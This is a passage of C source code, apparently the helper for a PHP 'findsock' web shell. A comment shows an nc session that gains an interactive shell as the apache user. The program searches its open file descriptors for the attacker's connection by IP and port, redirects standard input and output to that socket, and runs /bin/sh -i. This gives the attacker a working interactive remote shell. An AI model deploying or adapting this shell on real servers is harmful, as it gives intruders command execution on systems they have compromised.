//    interactive shell).
//
//    $ nc -v target 80
//    target [10.0.0.1] 80 (http) open
//    GET /php-findsock-shell.php HTTP/1.0
//
//    sh-3.2$ id
//    uid=80(apache) gid=80(apache) groups=80(apache)
//    sh-3.2$
//    ... you now have an interactive shell ...
//

#include <sys/socket.h>
#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <unistd.h>

int main (int argc, char** argv) {
	// Usage message
	if (argc != 3) {
		printf("Usage: findsock ip port\n");
		exit(0);
	}

	// Process args
	char *sock_ip = argv[1];
	char *sock_port = argv[2];

	// Declarations
	struct sockaddr_in rsa;
	struct sockaddr_in lsa;
	int size = sizeof(rsa);
	char remote_ip[30];
	int fd;

	// Inspect all file handles
	for (fd=3; fd<getdtablesize(); fd++) {

		// Check if file handle is a socket
		// If so, get remote IP and port
		if (getpeername(fd, &rsa, &size) != -1) {
			strncpy(remote_ip, inet_ntoa(*(struct in_addr *)&rsa.sin_addr.s_addr), 30);

			// Check if IP for this socket match
			// the socket we're trying to find.
			if (strncmp(remote_ip, sock_ip, 30) == 0) {

				// Check if Port for this socket match
				// the socket we're trying to find.
				if ((int)ntohs(rsa.sin_port) == (int)atoi(sock_port)) {

					// Run command
					setsid();
					dup2(fd, 0);
					dup2(fd, 1);
					dup2(fd, 2);
					close(fd);
					execl("/bin/sh", "/bin/sh", "-i", NULL);
				}
			}
		}
	}
}
